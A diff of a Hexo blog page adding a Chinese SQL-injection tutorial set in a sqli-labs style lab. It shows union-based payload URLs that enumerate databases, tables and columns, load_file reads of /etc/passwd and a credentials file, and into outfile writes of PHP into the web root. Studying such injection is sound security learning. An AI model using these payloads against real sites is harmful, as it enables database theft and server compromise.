@@ -32,8 +32,8 @@
     <!-- 黑夜模式样式 css -->
     <link rel="stylesheet" type="text/css" href="/css/day-night.css">
 
-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="爱睡懒觉的道士" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><link rel="alternate" href="/atom.xml" title="爱睡懒觉的道士" type="application/atom+xml">
+</head>
 
 
 
@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    13 分
                 </div>
                 
 
@@ -493,7 +506,331 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-SQL-注入-二"><a href="#WEB漏洞-SQL-注入-二" class="headerlink" title="WEB漏洞-SQL 注入(二)"></a><font size="6"><strong>WEB漏洞-SQL 注入(二)</strong></font></h2><span id="more"></span>
+
+<p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/1.png"></p>
+<h3 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a><font size="5"><strong>一、information_schema</strong></font></h3><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。<br>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
+<h4 id="●-SCHEMATA表"><a href="#●-SCHEMATA表" class="headerlink" title="● SCHEMATA表"></a><font size="4"><strong>● SCHEMATA表</strong></font></h4><p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p>
+<p>获取到数据库名称</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use information_schema<span class="token punctuation">;</span>
+mysql<span class="token operator">></span> <span class="token keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA<span class="token punctuation">;</span>
++--------------------+----------------------------+
+<span class="token operator">|</span> SCHEMA_NAME        <span class="token operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="token operator">|</span>
++--------------------+----------------------------+
+<span class="token operator">|</span> information_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span>
+<span class="token operator">|</span> challenges         <span class="token operator">|</span> gbk                        <span class="token operator">|</span>
+<span class="token operator">|</span> mysql              <span class="token operator">|</span> latin1                     <span class="token operator">|</span>
+<span class="token operator">|</span> performance_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span>
+<span class="token operator">|</span> security           <span class="token operator">|</span> gbk                        <span class="token operator">|</span>
++--------------------+----------------------------+
+</code></pre>
+<h4 id="●-TABLES-表"><a href="#●-TABLES-表" class="headerlink" title="● TABLES 表"></a><font size="4"><strong>● TABLES 表</strong></font></h4><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit 0,5<span class="token punctuation">;</span>
++---------------+--------------------+---------------------------------------+
+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME                            <span class="token operator">|</span>
++---------------+--------------------+---------------------------------------+
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS                        <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS                            <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMNS                               <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMN_PRIVILEGES                     <span class="token operator">|</span>
++---------------+--------------------+---------------------------------------+
+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+</code></pre>
+<h4 id="●-COLUMNS-表"><a href="#●-COLUMNS-表" class="headerlink" title="● COLUMNS 表"></a><font size="4"><strong>● COLUMNS 表</strong></font></h4><p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5<span class="token punctuation">;</span>
++---------------+--------------------+----------------+
+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME     <span class="token operator">|</span>
++---------------+--------------------+----------------+
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
++---------------+--------------------+----------------+
+</code></pre>
+<h4 id="●-USER-PRIVILEGES-表"><a href="#●-USER-PRIVILEGES-表" class="headerlink" title="● USER_PRIVILEGES 表"></a><font size="4"><strong>● USER_PRIVILEGES 表</strong></font></h4><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM USER_PRIVILEGES limit 0,5<span class="token punctuation">;</span>
++--------------------+---------------+----------------+--------------+
+<span class="token operator">|</span> GRANTEE            <span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> PRIVILEGE_TYPE <span class="token operator">|</span> IS_GRANTABLE <span class="token operator">|</span>
++--------------------+---------------+----------------+--------------+
+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> SELECT         <span class="token operator">|</span> YES          <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> INSERT         <span class="token operator">|</span> YES          <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> UPDATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> DELETE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> CREATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
++--------------------+---------------+----------------+--------------+
+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="二、跨库攻击"><a href="#二、跨库攻击" class="headerlink" title="二、跨库攻击"></a><font size="5"><strong>二、跨库攻击</strong></font></h3><p><strong>前提准备</strong></p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> create database book<span class="token punctuation">;</span>
+mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>
+mysql<span class="token operator">></span> CREATE TABLE IF NOT EXISTS book<span class="token punctuation">(</span>    <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> INT UNSIGNED AUTO_INCREMENT,    <span class="token variable"><span class="token variable">`</span>book_title<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>100<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>book_author<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>40<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>submission_date<span class="token variable">`</span></span> DATE,    PRIMARY KEY <span class="token punctuation">(</span> <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>
+mysql<span class="token operator">></span> show databases<span class="token punctuation">;</span>
++--------------------+
+<span class="token operator">|</span> Database           <span class="token operator">|</span>
++--------------------+
+<span class="token operator">|</span> information_schema <span class="token operator">|</span>
+<span class="token operator">|</span> book               <span class="token operator">|</span>
+<span class="token operator">|</span> mysql              <span class="token operator">|</span>
+<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
++--------------------+
+mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>
+mysql<span class="token operator">></span> show tables<span class="token punctuation">;</span>
++----------------+
+<span class="token operator">|</span> Tables_in_book <span class="token operator">|</span>
++----------------+
+<span class="token operator">|</span> book           <span class="token operator">|</span>
++----------------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> desc book<span class="token punctuation">;</span>
++-----------------+------------------+------+-----+---------+----------------+
+<span class="token operator">|</span> Field           <span class="token operator">|</span> Type             <span class="token operator">|</span> Null <span class="token operator">|</span> Key <span class="token operator">|</span> Default <span class="token operator">|</span> Extra          <span class="token operator">|</span>
++-----------------+------------------+------+-----+---------+----------------+
+<span class="token operator">|</span> book_id         <span class="token operator">|</span> int<span class="token punctuation">(</span>10<span class="token punctuation">)</span> unsigned <span class="token operator">|</span> NO   <span class="token operator">|</span> PRI <span class="token operator">|</span> NULL    <span class="token operator">|</span> auto_increment <span class="token operator">|</span>
+<span class="token operator">|</span> book_title      <span class="token operator">|</span> varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span>     <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
+<span class="token operator">|</span> book_author     <span class="token operator">|</span> varchar<span class="token punctuation">(</span>40<span class="token punctuation">)</span>      <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
+<span class="token operator">|</span> submission_date <span class="token operator">|</span> <span class="token function">date</span>             <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
++-----------------+------------------+------+-----+---------+----------------+
+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+</code></pre>
+<p>打开网页进行查询当前数据库的用户<br>?id&#x3D;-1%20union%20select%201,user(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/2.png"></p>
+<p>可以看到当前用户为root拥有最高的权限。</p>
+<p>获取到当前网页的数据库名?id&#x3D;-1%20union%20select%201,database(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/3.png"></p>
+<p>获取到当前网站的数据库是security</p>
+<h4 id="●-常见的数据库与用户的对应关系"><a href="#●-常见的数据库与用户的对应关系" class="headerlink" title="● 常见的数据库与用户的对应关系"></a><font size="4"><strong>● 常见的数据库与用户的对应关系</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库A<span class="token operator">=</span>网站A<span class="token operator">=</span>数据库用户A	——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据
+数据库B<span class="token operator">=</span>网站B<span class="token operator">=</span>数据库用户B	——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据
+数据库C<span class="token operator">=</span>网站C<span class="token operator">=</span>数据库用户C	——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据
+</code></pre>
+<p><strong>备注：</strong>这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p>
+<h4 id="●-在数据库中查询有哪些用户"><a href="#●-在数据库中查询有哪些用户" class="headerlink" title="● 在数据库中查询有哪些用户"></a><font size="4"><strong>● 在数据库中查询有哪些用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use mysql<span class="token punctuation">;</span>
+Database changed
+mysql<span class="token operator">></span> <span class="token keyword">select</span> host,user,password from user<span class="token punctuation">;</span>
++--------------+------+----------+
+<span class="token operator">|</span> host         <span class="token operator">|</span> user <span class="token operator">|</span> password <span class="token operator">|</span>
++--------------+------+----------+
+<span class="token operator">|</span> localhost    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>
+<span class="token operator">|</span> 2c8a2316583a <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>
+<span class="token operator">|</span> 127.0.0.1    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>
+<span class="token operator">|</span> ::1          <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>
++--------------+------+----------+
+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="●-在源码中查看使用的是哪一个用户"><a href="#●-在源码中查看使用的是哪一个用户" class="headerlink" title="● 在源码中查看使用的是哪一个用户"></a><font size="4"><strong>● 在源码中查看使用的是哪一个用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@2c8a2316583a:/var/www/html<span class="token comment" spellcheck="true"># cat sql-connections/db-creds.inc</span>
+<span class="token operator">&lt;</span>?php
+
+//give your mysql connection username n password
+<span class="token variable">$dbuser</span> <span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>
+<span class="token variable">$dbpass</span> <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$dbname</span> <span class="token operator">=</span><span class="token string">"security"</span><span class="token punctuation">;</span>
+<span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string">'localhost'</span><span class="token punctuation">;</span>
+<span class="token variable">$dbname1</span> <span class="token operator">=</span> <span class="token string">"challenges"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p>一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security</p>
+<p> 跨库查询的前提条件是必须<font color=" red"><strong>高权限</strong></font>的用户才能执行跨库查询。<br>?id&#x3D;-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/4.png"></p>
+<h4 id="●-数据库中执行"><a href="#●-数据库中执行" class="headerlink" title="● 数据库中执行"></a><font size="4"><strong>● 数据库中执行</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,schema_name,3 from information_schema.schemata LIMIT 0,1<span class="token punctuation">;</span>
++----+--------------------+----------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username           <span class="token operator">|</span> password <span class="token operator">|</span>
++----+--------------------+----------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema <span class="token operator">|</span> 3        <span class="token operator">|</span>
++----+--------------------+----------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="●-1、获取到所有的数据库名称"><a href="#●-1、获取到所有的数据库名称" class="headerlink" title="● 1、获取到所有的数据库名称"></a><font size="4"><strong>● 1、获取到所有的数据库名称</strong></font></h4><p>union select 1,group_concat(schema_name),3 from information_schema.schemata<br>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/5.png"><br>等同于在数据库中执行以下命令</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>
+Reading table information <span class="token keyword">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>,3 from information_schema.schemata  LIMIT 0,1<span class="token punctuation">;</span>
++----+----------------------------------------------------------------------+----------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                                             <span class="token operator">|</span> password <span class="token operator">|</span>
++----+----------------------------------------------------------------------+----------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema,book,challenges,mysql,performance_schema,security <span class="token operator">|</span> 3        <span class="token operator">|</span>
++----+----------------------------------------------------------------------+----------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="●-2、指定获取book库中的表名信息"><a href="#●-2、指定获取book库中的表名信息" class="headerlink" title="● 2、指定获取book库中的表名信息"></a><font size="4"><strong>● 2、指定获取book库中的表名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/6.png"><br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’</p>
+<p>等同于在数据库中执行以下命令</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3 from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>
++----+----------+----------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
++----+----------+----------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> book     <span class="token operator">|</span> 3        <span class="token operator">|</span>
++----+----------+----------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="●-3、获取指定数据库book下的book表的列名信息"><a href="#●-3、获取指定数据库book下的book表的列名信息" class="headerlink" title="● 3、获取指定数据库book下的book表的列名信息"></a><font size="4"><strong>● 3、获取指定数据库book下的book表的列名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/7.png"><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’book’ and table_schema&#x3D;’book’<br>等同于以下的数据库命</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>
+Reading table information <span class="token keyword">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3 from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'book'</span> and table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>
++----+------------------------------------------------+----------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                       <span class="token operator">|</span> password <span class="token operator">|</span>
++----+------------------------------------------------+----------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> book_id,book_title,book_author,submission_date <span class="token operator">|</span> 3        <span class="token operator">|</span>
++----+------------------------------------------------+----------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="●-4、查询到指定数据"><a href="#●-4、查询到指定数据" class="headerlink" title="● 4、查询到指定数据"></a><font size="4"><strong>● 4、查询到指定数据</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/8.png"></p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union  <span class="token keyword">select</span> book_id,book_title,book_author from book.book  LIMIT 0,1<span class="token punctuation">;</span>
++----+----------+----------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
++----+----------+----------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> Linux    <span class="token operator">|</span> oldjiang <span class="token operator">|</span>
++----+----------+----------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<p>备注：username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</p>
+<h3 id="三、文件读写函数"><a href="#三、文件读写函数" class="headerlink" title="三、文件读写函数"></a><font size="5"><strong>三、文件读写函数</strong></font></h3><p>参考地址：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a><br>load_file						文件读取<br>into outfile 或into dumpfile		文件写入</p>
+<p>查询是否有写入的权限</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>
++------------------+-------+
+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>
++------------------+-------+
+<span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>
++------------------+-------+
+</code></pre>
+<table>
+    <thead>
+        <tr>
+            <th>Value</th>
+            <th>说明</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>NULL</td>
+            <td>不允许导入或导出</td>
+        </tr>
+        <tr>
+            <td>/tmp</td>
+            <td>只允许在 /tmp 目录导入导出</td>
+        </tr>
+        <tr>
+            <td>空</td>
+            <td>不限制目录</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<p><font color=" red"><strong>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</strong></font></p>
+<h4 id="●-文件读取"><a href="#●-文件读取" class="headerlink" title="● 文件读取"></a><font size="4"><strong>● 文件读取</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>\G<span class="token punctuation">;</span>
+*************************** 1. row ***************************
+load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+ERROR:
+No query specified
+
+mysql<span class="token operator">></span>
+</code></pre>
+<p>读取敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a><br>在网站上面读取内容:?id&#x3D;-2%20union%20select%201,load_file(%27&#x2F;etc&#x2F;passwd%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/9.png"></p>
+<p>读取数据库的配置信息<br>?id&#x3D;-1%20union%20select%201,load_file(%27&#x2F;var&#x2F;www&#x2F;html&#x2F;sql-connections&#x2F;db-creds.inc%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/10.png"></p>
+<p>右击查看源代码<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/11.png"></p>
+<h4 id="●-文件写入"><a href="#●-文件写入" class="headerlink" title="● 文件写入"></a><font size="4"><strong>● 文件写入</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'./php'</span><span class="token punctuation">;</span>
+Query OK, 1 row affected <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+root@06026a1599f9:/<span class="token comment" spellcheck="true"># cat /var/lib/mysql/php</span>
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'/var/www/php'</span><span class="token punctuation">;</span>
+ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/php' <span class="token punctuation">(</span>Errcode: 13<span class="token punctuation">)</span>
+mysql<span class="token operator">></span>
+</code></pre>
+<p>在linux中默认是对&#x2F;var&#x2F;lib&#x2F;mysql目录下有写入权限对其他目录是没有写入权限。<br>对目录修改权限测试</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'/var/www/html/test.php'</span><span class="token punctuation">;</span>
+ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/html/test.php<span class="token string">' (Errcode: 13)
+mysql> \q
+root@06026a1599f9:/# chmod -Rf 777 /var/www/html/
+root@06026a1599f9:/# mysql
+mysql> select '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span><span class="token string">' into outfile '</span>/var/www/html/test.php'<span class="token punctuation">;</span>
+mysql<span class="token operator">></span>
+</code></pre>
+<p>在网页上写入<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/12.png"></p>
+<pre class=" language-bash"><code class="language-bash">root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># pwd</span>
+/var/lib/mysql
